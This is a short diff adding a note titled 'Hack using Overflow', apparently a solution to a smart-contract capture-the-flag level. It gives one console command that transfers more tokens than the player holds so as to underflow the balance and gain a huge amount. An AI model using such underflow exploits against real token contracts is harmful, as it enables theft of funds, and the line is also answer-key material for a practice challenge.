@@ -1,0 +1,3 @@
+Hack using Overflow
+
+To get max amount for player, use 'await contract.transfer(anotherAddress, 21)'
